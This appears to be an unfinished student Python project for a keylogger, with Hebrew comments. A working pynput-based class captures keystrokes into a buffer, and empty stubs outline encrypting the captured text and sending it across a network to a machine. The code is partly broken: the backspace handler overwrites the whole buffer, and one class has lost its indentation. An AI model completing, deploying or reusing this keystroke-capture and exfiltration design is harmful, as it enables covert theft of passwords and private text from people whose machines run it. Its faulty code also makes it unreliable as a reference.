import ctypes
from pynput import keyboard
from abc import ABC, abstractmethod
from typing import List
class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass
    @abstractmethod
    def stop_logging(self) -> None:
        pass
    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass
class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.buffer = ""
        self.listener = None
        self.running = False

    def start_logging(self) -> None:
        self.running = True
        with keyboard.Listener(on_press=self.on_press) as self.listener:
            self.listener.join()

    def on_press(self,key):
        try:
            self.buffer += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.buffer += " "
            elif key == keyboard.Key.enter:
                self.buffer += "\n"
            elif key == keyboard.Key.backspace and self.buffer:
                self.buffer = "מחיקת תו"
        if len(self.buffer) >= 4 and self.buffer[-4:] == "show":
            self.stop_logging()

#כאן נדרש העברה ל 4
    def stop_logging(self) -> None:
        if self.listener:
            self.running = False
            self.listener.stop()
    def get_logged_keys(self) -> List[str]:
        return list(self.buffer)

    #מתודה ששואלת את windous באיזה שפה המשתמש מקליד ועובדת לפיה(לא בטוח)
    # def get_keyboard_language(self) -> str:
    #     # https://stackoverflow.com/questions/6397575/get-the-current-keyboard-layout-language-in-python
    #     GetKeyboardLayoutName = ctypes.windll.user32.GetKeyboardLayoutNameW
    #     buffer = ctypes.create_unicode_buffer(16)
    #     GetKeyboardLayoutName(buffer)
    #     return buffer.value

    #הקריאה לstart  ן  stop
# if __name__ == "__main__":
#     keylogger = KeyLoggerService()
#     keylogger.start_logging()
# #     "".join(keylogger.get_logged_keys())
#
#2

# iwriter.py
from abc import ABC, abstractmethod
class IWriter(ABC):
@abstractmethod
def send_data(self, data: str, machine_name: str) -> None:
pass

#3
class Encryptor:
    pass


#4
class KeyLoggerManager:
    pass

#5
class NetworkWriter:

   #תוצאה נדרשת
#send_data(data: str, machine_name: str) -> None

   pass

#חלק 2 בניית Backend


